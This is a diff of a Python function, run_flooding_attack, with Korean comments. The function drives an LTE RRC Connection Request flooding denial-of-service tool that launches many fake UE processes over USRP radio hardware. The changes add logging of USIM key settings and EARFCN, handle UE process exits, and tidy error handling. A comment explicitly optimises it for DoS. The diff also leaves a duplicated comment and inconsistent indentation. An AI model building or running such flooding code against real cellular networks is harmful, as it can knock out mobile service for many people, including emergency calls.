@@ -176,6 +176,9 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
                         logger.info(f"  로그 파일: {current_log_file}")
                         logger.info(f"  프로세스 PID: {current_process.pid}")
+                        logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
+                        logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
+                        logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
                     
                     ue_id += 1
                     if (ue_id - 1) % 50 == 0:
@@ -202,19 +205,26 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     continue
             
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
-            if current_process and current_log_file:
-                # 로그 파일이 생성되었는지 확인
-                if not os.path.exists(current_log_file):
-                    # 로그 파일이 아직 생성되지 않았으면 잠시 대기
+            if current_process:
+                # 프로세스가 종료되었는지 먼저 확인
+                if current_process.poll() is not None:
+                    # 프로세스가 종료됨
                     elapsed = time.time() - process_start_time if process_start_time else 0
-                    if elapsed > 0.5:  # 0.5초 지났는데도 로그 파일이 없으면
-                        logger.debug(f"로그 파일이 생성되지 않음: {current_log_file} (경과: {elapsed:.2f}초)")
-                    time.sleep(0.1)
+                    return_code = current_process.returncode
+                    logger.info(f"UE 프로세스가 종료됨 (경과: {elapsed:.2f}초, 종료 코드: {return_code})")
+                    if return_code != 0:
+                        logger.warning(f"UE 프로세스가 비정상 종료 (종료 코드: {return_code})")
+                    current_process = None
+                    process_start_time = None
+                    current_log_file = None
                     continue
                 
-                try:
-                    with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
-                        log_content = f.read()
+                # 로그 파일이 생성되었는지 확인
+                if current_log_file and os.path.exists(current_log_file):
+                
+                    try:
+                        with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                            log_content = f.read()
                     
                     # RRC Connection Request 전송 확인 (정확히 이것만 체크)
                     rrc_request_sent = any(keyword in log_content.lower() for keyword in [
@@ -268,9 +278,17 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                                 current_process.kill()
                         current_process = None
                         process_start_time = None
+                        current_log_file = None
                         continue
-                except:
-                    pass
+                    except Exception as e:
+                        logger.debug(f"로그 파일 읽기 오류: {e}")
+                elif current_log_file:
+                    # 로그 파일이 아직 생성되지 않음
+                    elapsed = time.time() - process_start_time if process_start_time else 0
+                    if elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
+                        logger.debug(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초)")
+            
+            # 짧은 대기 후 다시 확인
             
             # 짧은 대기 후 다시 확인
             time.sleep(0.1)
